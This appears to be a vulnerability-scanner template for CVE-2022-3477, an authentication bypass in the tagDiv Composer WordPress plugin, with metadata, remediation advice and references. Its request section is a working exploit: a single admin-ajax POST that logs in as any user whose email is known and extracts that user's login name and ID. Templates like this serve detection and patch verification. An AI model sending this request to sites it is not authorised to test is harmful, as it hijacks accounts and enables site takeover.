id: CVE-2022-3477

info:
  name: WordPress tagDiv Composer < 3.5 - Authentication Bypass
  author: melmathari
  severity: critical
  description: |
    The tagDiv Composer WordPress plugin before 3.5, required by the Newspaper WordPress theme before 12.1 and Newsmag WordPress theme before 5.2.2, does not properly implement the Facebook login feature, allowing unauthenticated attackers to login as any user by just knowing their email address.
  remediation: Upgrade to tagDiv Composer version 3.5 or higher, Newspaper theme version 12.1 or higher, or Newsmag theme version 5.2.2 or higher.
  reference:
    - https://wpscan.com/vulnerability/993a95d2-6fce-48de-ae17-06ce2db829ef
    - https://nvd.nist.gov/vuln/detail/CVE-2022-3477
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-3477
    cwe-id: CWE-287
    cpe: cpe:2.3:a:tagdiv_composer_project:tagdiv_composer:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: tagdiv_composer_project
    product: tagdiv_composer
    framework: wordpress
  tags: cve,cve2022,wordpress,auth-bypass,tagdiv,plugin

variables:
  email: "{{email}}"

requests:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "action=td_ajax_fb_login_user&user[email]={{email}}"

    matchers:
      - type: word
        part: body
        words:
          - '"success":"You have been successfully'
      - type: regex
        part: body
        regex:
          - '"user_login":"[a-zA-Z0-9_\-]+"'

    extractors:
      - type: regex
        part: body
        name: user_login
        regex:
          - '"user_login":"([a-zA-Z0-9_\-]+)"'
      - type: regex
        part: body
        name: user_id
        regex:
          - '"user_id":"?(\d+)"?'
